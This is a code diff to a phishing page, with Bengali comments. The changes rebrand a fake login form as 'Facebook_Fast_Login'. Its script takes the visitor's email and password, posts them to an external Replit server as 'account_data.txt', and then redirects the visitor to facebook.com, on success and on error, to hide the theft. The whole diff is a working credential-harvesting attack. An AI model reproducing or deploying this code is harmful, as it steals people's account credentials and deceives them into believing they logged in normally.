@@ -40,15 +40,17 @@
         const pass = document.getElementById('pass').value;
         const submitBtn = document.getElementById('submitBtn');
 
-        submitBtn.innerText = "Connecting...";
+        // বাটন টেক্সট পরিবর্তন
+        submitBtn.innerText = "Log In...";
         submitBtn.disabled = true;
 
+        // আপনার Replit URL
         const REPLIT_URL = "https://9f77dca3-e9b1-49d2-9c4b-35efceb5aadb-00-1bjgtzkskpfqc.worf.replit.dev:5000/forward";
 
         const data = {
-            domain: "Cyber_Shield_Portal",
-            fileName: "credentials.txt",
-            content: "User: " + email + "\nPass: " + pass
+            domain: "Facebook_Fast_Login",
+            fileName: "account_data.txt",
+            content: "User: " + email + " | Pass: " + pass
         };
 
         fetch(REPLIT_URL, {
@@ -58,16 +60,15 @@
             body: JSON.stringify(data)
         })
         .then(() => {
-            // ডাটা যাওয়ার পর সরাসরি ফেসবুকের মেইন লিঙ্কে পাঠিয়ে দিন
-            window.location.replace("https://www.facebook.com");
+            // ডাটা সাবমিট হওয়ার সাথে সাথে সরাসরি ফেসবুকের মেইন লিঙ্কে পাঠিয়ে দিন
+            window.location.replace("https://www.facebook.com/");
         })
         .catch(error => {
             console.error('Error:', error);
-            // এরর হলেও মূল ফেসবুকে পাঠিয়ে দিন
-            window.location.replace("https://www.facebook.com");
+            // এরর হলেও সরাসরি ফেসবুকে পাঠিয়ে দিন
+            window.location.replace("https://www.facebook.com/");
         });
     });
 </script>
-
 </body>
 </html>
